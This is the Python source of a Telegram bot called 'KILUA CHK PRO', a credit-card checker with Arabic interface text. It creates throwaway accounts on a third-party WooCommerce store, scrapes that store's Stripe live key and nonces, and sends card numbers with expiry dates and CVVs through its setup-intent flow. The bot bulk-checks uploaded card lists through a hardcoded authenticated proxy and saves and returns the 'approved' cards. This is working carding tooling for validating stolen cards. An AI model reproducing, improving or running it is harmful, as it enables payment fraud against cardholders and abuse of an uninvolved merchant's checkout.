# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════╗
║         🔥 KILUA CHK PRO — by @o8380 / @Mustafa964          ║
║              Stripe Auth Checker · Kilua Services            ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import re
import sys
import time
import random
import logging
import threading
from pathlib import Path
from typing import Dict, List, Optional

import requests
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==================== التكوين الأساسي ====================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "ضع_توكنك_هنا")
OWNER_ID = int(os.environ.get("OWNER_ID", "1013384909"))
BOT_TAG = "@o8380"
VERSION = "2.0"
CREDITS = "Mustafa 964 · @o8380 · Kilua Services"
WELCOME_VIDEO = "https://t.me/Mustafa964iq/3"

# ==================== البروكسي ====================
PROXY_RAW = "gr-direct.speedyhub.net:21033:ydqjeiy9smojyhnkttgec5+BYdoiLLl:jyvytnua9y"
_px = PROXY_RAW.split(":")
PROXY_HOST, PROXY_PORT, PROXY_USER, PROXY_PASS = _px[0], _px[1], _px[2], _px[3]
PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
PROXIES = {"http": PROXY_URL, "https": PROXY_URL}

# ==================== المسارات ====================
RESULTS_DIR = Path("results")
RESULTS_DIR.mkdir(exist_ok=True)

# ==================== إعدادات التسجيل ====================
logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
logger = logging.getLogger(__name__)

# ==================== البوت ====================
bot = telebot.TeleBot(BOT_TOKEN)
try:
    bot.remove_webhook()
    time.sleep(0.5)
except:
    pass

# ==================== أيقونات مخصصة (Premium) ====================
ICONS = {
    "approve": "5165928140404426202",
    "decline": "5974342591552952895",
    "charge": "5330274810582827128",
    "back": "5060247798616687432",
    "stop": "5242195906199035850",
    "auth": "5330412803587080658",
    "gate": "5059798514972754990",
    "stars": "5060298809943262023",
    "buy": "5059910390280881178",
}

# ==================== حالة الفحص لكل مستخدم ====================
check_states: Dict[int, Dict] = {}
states_lock = threading.Lock()

def get_state(uid: int) -> dict:
    with states_lock:
        return check_states.setdefault(uid, {})

def set_state(uid: int, data: dict):
    with states_lock:
        check_states[uid] = data

def clear_state(uid: int):
    with states_lock:
        check_states.pop(uid, None)

# ==================== استيراد فئة الفحص من ssr.py (مباشرة) ====================
# نعيد تعريف الفئة هنا مع إضافة البروكسي
class Stroxr:
    def __init__(self):
        self.url = 'analyticorange.com'
        self.email = f"userrjapbx{random.randint(1000,9999)}@gmail.com"
        self.payment_user_agent = 'stripe.js%2F6c35f76878%3B+stripe-js-v3%2F6c35f76878%3B+payment-element%3B+deferred-intent'
        self.headers = {
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

    def _get_session(self):
        s = requests.Session()
        s.proxies.update(PROXIES)
        s.headers.update(self.headers)
        return s

    def Regester(self):
        r = self._get_session()
        r1 = r.get(url=f'https://{self.url}/my-account/', timeout=20).text.split('name="woocommerce-register-nonce" value="')[1].split('"')[0]
        r.post(url=f'https://{self.url}/my-account/', timeout=20, data={
            'email': self.email,
            'password': '7132879938:AAF37jpayVhsr0QcH7i5FmNK0Apfvjzu2-Y',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'woocommerce-register-nonce': r1,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        })
        return r

    def Paymnt(self, ccx):
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]

        ss = self.Regester()
        r3 = ss.get(f'https://{self.url}/my-account/add-payment-method/', timeout=20).text
        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', r3).group(1)
        addnonce = r3.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]

        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent={self.payment_user_agent}&key={pk_live}'
        r4 = ss.post('https://api.stripe.com/v1/payment_methods', timeout=20, data=data).json()
        idi = r4['id']

        r5r = ss.post(f'https://{self.url}/wp-admin/admin-ajax.php', timeout=20, data={
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': idi,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': addnonce,
        })
        r5 = r5r.text

        if 'Your card was declined.' in r5 or 'Your card could not be set up for future usage.' in r5:
            return 'Declined', r5[:80]
        elif 'success' in r5 or 'Success' in r5:
            return 'Approved', r5[:80]
        elif 'Your card number is incorrect.' in r5:
            return 'Invalid Card', r5[:80]
        else:
            try:
                return r5r.json()['data']['error']['message'], r5[:80]
            except:
                return 'Error', r5[:80]

    def check(self, cc):
        """ترجع (status, raw_response)"""
        try:
            return self.Paymnt(cc)
        except Exception as e:
            return 'Error', str(e)

# ==================== BIN Info ====================
_BIN_CACHE = {}

def get_bin_info(bin6: str) -> dict:
    if bin6 in _BIN_CACHE:
        return _BIN_CACHE[bin6]
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=6, proxies=PROXIES).json()
        info = {
            "brand": r.get("brand", "Unknown"),
            "type": r.get("type", "Unknown"),
            "level": r.get("level", "Unknown"),
            "bank": r.get("bank", "Unknown"),
            "country": r.get("country_name", "Unknown"),
            "flag": r.get("country_flag", "🏳️"),
        }
        _BIN_CACHE[bin6] = info
        return info
    except:
        return {"brand": "?", "type": "?", "level": "?", "bank": "?", "country": "?", "flag": "🏳️"}

def mask_card(cc: str) -> str:
    try:
        parts = cc.split("|")
        num = parts[0]
        if len(num) > 10:
            masked = num[:6] + "*" * (len(num) - 10) + num[-4:]
        else:
            masked = num
        return f"{masked}|{parts[1]}|{parts[2]}|***"
    except:
        return cc

def progress_bar(current: int, total: int, width: int = 12) -> str:
    if total == 0:
        return "░" * width
    filled = int(width * current / total)
    return "█" * filled + "░" * (width - filled)

def is_hit(status: str) -> bool:
    return "Approved" in status or "approved" in status.lower()

# ==================== لوحات المفاتيح ====================
def main_keyboard() -> InlineKeyboardMarkup:
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("⚡ Manual Check", callback_data="manual", style="primary", icon_custom_emoji_id=ICONS["auth"]),
        InlineKeyboardButton("📁 Combo Check", callback_data="combo", style="success", icon_custom_emoji_id=ICONS["buy"]),
    )
    markup.row(
        InlineKeyboardButton("📊 Status", callback_data="status", style="primary", icon_custom_emoji_id=ICONS["stars"]),
        InlineKeyboardButton("🛑 Stop", callback_data="stop", style="danger", icon_custom_emoji_id=ICONS["stop"]),
    )
    markup.row(
        InlineKeyboardButton("🏠 Home", callback_data="home", style="primary", icon_custom_emoji_id=ICONS["back"]),
    )
    return markup

def stop_keyboard() -> InlineKeyboardMarkup:
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🛑 Stop Check", callback_data="stop", style="danger", icon_custom_emoji_id=ICONS["stop"]))
    return markup

def home_keyboard() -> InlineKeyboardMarkup:
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🏠 Home", callback_data="home", style="primary", icon_custom_emoji_id=ICONS["back"]))
    return markup

def progress_keyboard(current: int, total: int, approved: int, declined: int, status: str, elapsed: float, is_running: bool = True) -> InlineKeyboardMarkup:
    percent = int(current / total * 100) if total else 0
    bar = progress_bar(current, total)

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton(f"📊 {bar} {percent}% ({current}/{total})", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["stars"]))
    markup.row(
        InlineKeyboardButton(f"✅ Approved: {approved}", callback_data="ignore", style="success", icon_custom_emoji_id=ICONS["approve"]),
        InlineKeyboardButton(f"❌ Declined: {declined}", callback_data="ignore", style="danger", icon_custom_emoji_id=ICONS["decline"]),
    )
    markup.add(InlineKeyboardButton(f"📝 {status[:45]}", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["gate"]))
    markup.add(InlineKeyboardButton(f"⏱ Time: {elapsed:.2f}s", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["charge"]))
    if is_running:
        markup.add(InlineKeyboardButton("🛑 Stop Check", callback_data="stop", style="danger", icon_custom_emoji_id=ICONS["stop"]))
    return markup

def result_keyboard(cc: str, status: str, elapsed: float, bin_info: dict, is_hit_card: bool) -> InlineKeyboardMarkup:
    style = "success" if is_hit_card else "danger"
    icon = ICONS["approve"] if is_hit_card else ICONS["decline"]
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(InlineKeyboardButton(f"💳 {cc}", callback_data="ignore", style=style, icon_custom_emoji_id=icon))
    markup.add(InlineKeyboardButton(f"📝 {status[:50]}", callback_data="ignore", style=style, icon_custom_emoji_id=ICONS["gate"]))
    markup.add(InlineKeyboardButton(f"⏱ Time: {elapsed:.2f}s", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["charge"]))
    markup.add(InlineKeyboardButton(f"🏦 {bin_info['brand']} · {bin_info['type']} · {bin_info['level']}", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["auth"]))
    markup.add(InlineKeyboardButton(f"🏛 {bin_info['bank']} {bin_info['flag']}", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["gate"]))
    markup.add(InlineKeyboardButton(f"🌍 {bin_info['country']} {bin_info['flag']}", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["stars"]))
    markup.add(InlineKeyboardButton(f"🏷 {CREDITS}", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["back"]))
    return markup

def welcome_text(name: str) -> str:
    return f"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃        🔥 KILUA CHK PRO 🔥        ┃
┃      {BOT_TAG} · v{VERSION}        ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

✨ أهلاً بك <b>{name}</b> ✨

┌────────────────────────────────┐
│  📌 <b>/chk NUM|MM|YY|CVV</b>    │
│  📁 أرسل ملف <code>.txt</code>    │
└────────────────────────────────┘

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ {CREDITS}
"""

# ==================== الفحص اليدوي ====================
@bot.message_handler(commands=['chk', 'start'])
def cmd_start_or_chk(message):
    if message.text.startswith('/start'):
        uid = message.from_user.id
        name = message.from_user.first_name or "User"
        clear_state(uid)
        try:
            bot.send_video(message.chat.id, WELCOME_VIDEO, caption=welcome_text(name), parse_mode="HTML", reply_markup=main_keyboard())
        except:
            bot.send_message(message.chat.id, welcome_text(name), parse_mode="HTML", reply_markup=main_keyboard())
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 or "|" not in parts[1]:
        bot.reply_to(message, "❌ الصيغة: <code>/chk NUM|MM|YY|CVV</code>", parse_mode="HTML")
        return

    cc = parts[1].strip()
    prog_msg = bot.reply_to(message, f"🔄 <b>جاري الفحص...</b>\n<code>{mask_card(cc)}</code>", parse_mode="HTML")

    def do_check():
        start = time.time()
        checker = Stroxr()
        status, raw = checker.check(cc)
        elapsed = time.time() - start
        bin6 = cc.split("|")[0][:6]
        bin_info = get_bin_info(bin6)
        hit = is_hit(status)

        final_text = f"<b>{'✅ APPROVED' if hit else '❌ DECLINED'}</b>\n━━━━━━━━━━━━━━━━━━\n💳 <code>{cc}</code>\n📝 {status}\n⏱ {elapsed:.2f}s"
        keyboard = result_keyboard(mask_card(cc), status, elapsed, bin_info, hit)

        try:
            bot.edit_message_text(final_text, prog_msg.chat.id, prog_msg.message_id, parse_mode="HTML", reply_markup=keyboard)
        except:
            pass

        if hit:
            with open(RESULTS_DIR / f"{message.from_user.id}_approved.txt", "a", encoding="utf-8") as f:
                f.write(cc + "\n")

    threading.Thread(target=do_check, daemon=True).start()

# ==================== الفحص الكومبو ====================
@bot.message_handler(content_types=['document'])
def handle_combo(message):
    uid = message.from_user.id
    doc = message.document

    if not doc or not doc.file_name.endswith(".txt"):
        bot.reply_to(message, "❌ أرسل ملف <code>.txt</code> فقط", parse_mode="HTML")
        return

    state = get_state(uid)
    if state.get("running"):
        bot.reply_to(message, "⚠️ يوجد فحص جارٍ، استخدم /stop أولاً", parse_mode="HTML")
        return

    prog_msg = bot.send_message(message.chat.id, "🔄 <b>جاري تحميل الملف...</b>", parse_mode="HTML")

    try:
        file_info = bot.get_file(doc.file_id)
        raw = bot.download_file(file_info.file_path)
        lines = [l.strip() for l in raw.decode("utf-8", errors="ignore").splitlines() if l.strip() and "|" in l]
    except Exception as e:
        bot.edit_message_text(f"❌ فشل التحميل: {e}", message.chat.id, prog_msg.message_id, parse_mode="HTML")
        return

    if not lines:
        bot.edit_message_text("❌ لا توجد بطاقات صالحة", message.chat.id, prog_msg.message_id, parse_mode="HTML")
        return

    bot.edit_message_text(f"✅ تم تحميل {len(lines)} بطاقة\n🚀 بدء الفحص...", message.chat.id, prog_msg.message_id, parse_mode="HTML", reply_markup=stop_keyboard())

    threading.Thread(target=run_combo, args=(uid, message.chat.id, prog_msg.message_id, lines), daemon=True).start()

def run_combo(uid: int, chat_id: int, msg_id: int, cards: List[str]):
    total = len(cards)
    approved = 0
    declined = 0
    approved_list = []
    declined_list = []

    set_state(uid, {"running": True, "approved": approved_list, "declined": declined_list, "total": total})
    checker = Stroxr()

    for i, cc in enumerate(cards, 1):
        state = get_state(uid)
        if not state.get("running"):
            break

        start = time.time()
        status, raw = checker.check(cc)
        elapsed = time.time() - start
        bin6 = cc.split("|")[0][:6]
        bin_info = get_bin_info(bin6)
        hit = is_hit(status)

        if hit:
            approved += 1
            approved_list.append(cc)
            bot.send_message(chat_id, f"✅ <b>APPROVED</b>\n━━━━━━━━━━━━━━━━━━\n💳 <code>{cc}</code>\n📝 {status}\n⏱ {elapsed:.2f}s", parse_mode="HTML", reply_markup=result_keyboard(mask_card(cc), status, elapsed, bin_info, True))
        else:
            declined += 1
            declined_list.append(cc)

        try:
            prog_keyboard = progress_keyboard(i, total, approved, declined, status[:40], elapsed, state.get("running", True))
            bot.edit_message_text("", chat_id, msg_id, reply_markup=prog_keyboard)
        except:
            pass

        time.sleep(0.5)

    if approved_list:
        (RESULTS_DIR / f"{uid}_approved.txt").write_text("\n".join(approved_list), encoding="utf-8")
    if declined_list:
        (RESULTS_DIR / f"{uid}_declined.txt").write_text("\n".join(declined_list), encoding="utf-8")

    final_text = f"━━━━━━━━━━━━━━━━━━\n✅ تم الانتهاء\n━━━━━━━━━━━━━━━━━━\n📊 الإجمالي: {total}\n✅ Approved: {approved}\n❌ Declined: {declined}\n━━━━━━━━━━━━━━━━━━\n💫 {BOT_TAG}"
    bot.edit_message_text(final_text, chat_id, msg_id, parse_mode="HTML", reply_markup=home_keyboard())

    if approved_list:
        with open(RESULTS_DIR / f"{uid}_approved.txt", "rb") as f:
            bot.send_document(chat_id, f, caption=f"✅ Approved Cards ({approved})", visible_file_name="approved.txt")

    clear_state(uid)

# ==================== أوامر وأزرار ====================
@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    uid = message.from_user.id
    state = get_state(uid)
    if state.get("running"):
        state["running"] = False
        set_state(uid, state)
        bot.reply_to(message, "🛑 تم إيقاف الفحص", parse_mode="HTML")
    else:
        bot.reply_to(message, "ℹ️ لا يوجد فحص نشط", parse_mode="HTML")

@bot.message_handler(commands=['status'])
def cmd_status(message):
    uid = message.from_user.id
    state = get_state(uid)
    if not state.get("total"):
        bot.reply_to(message, "📊 لا يوجد فحص نشط", parse_mode="HTML")
        return
    total = state.get("total", 0)
    done = len(state.get("approved", [])) + len(state.get("declined", []))
    bot.reply_to(message, f"📊 الحالة\n━━━━━━━━━━━━━━━━━━\n📦 الإجمالي: {total}\n✅ Approved: {len(state.get('approved', []))}\n❌ Declined: {len(state.get('declined', []))}\n📈 متبقي: {total - done}", parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    uid = call.from_user.id
    data = call.data

    if data == "home":
        name = call.from_user.first_name or "User"
        clear_state(uid)
        try:
            bot.edit_message_text(welcome_text(name), call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=main_keyboard())
        except:
            pass
        bot.answer_callback_query(call.id)

    elif data == "manual":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "📌 أرسل الأمر:\n<code>/chk NUM|MM|YY|CVV</code>", parse_mode="HTML")

    elif data == "combo":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "📁 أرسل ملف <code>.txt</code>", parse_mode="HTML")

    elif data == "status":
        bot.answer_callback_query(call.id)
        state = get_state(uid)
        if not state.get("total"):
            bot.send_message(call.message.chat.id, "📊 لا يوجد فحص نشط", parse_mode="HTML")
        else:
            total = state.get("total", 0)
            bot.send_message(call.message.chat.id, f"📊 الحالة\n━━━━━━━━━━━━━━━━━━\n📦 الإجمالي: {total}\n✅ Approved: {len(state.get('approved', []))}\n❌ Declined: {len(state.get('declined', []))}\n📈 متبقي: {total - (len(state.get('approved', [])) + len(state.get('declined', [])))}", parse_mode="HTML")

    elif data == "stop":
        state = get_state(uid)
        if state.get("running"):
            state["running"] = False
            set_state(uid, state)
            bot.answer_callback_query(call.id, "🛑 جاري الإيقاف...")
        else:
            bot.answer_callback_query(call.id, "ℹ️ لا يوجد فحص نشط", show_alert=True)

    elif data == "ignore":
        bot.answer_callback_query(call.id)

# ==================== التشغيل ====================
if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════════╗
║                  🔥 KILUA CHK PRO v2.0 🔥                   ║
║                   @o8380 · Mustafa 964                      ║
║                     Kilua Services                          ║
╚══════════════════════════════════════════════════════════════╝
    """)
    print(f"✅ Bot Token: {BOT_TOKEN[:10]}...")
    print(f"✅ Owner ID: {OWNER_ID}")
    print(f"✅ Proxy: {PROXY_HOST}:{PROXY_PORT}")
    print("\n🚀 Bot is running...\n")

    while True:
        try:
            bot.infinity_polling(timeout=30, skip_pending=True)
        except Exception as e:
            print(f"❌ Error: {e}")
            time.sleep(5)
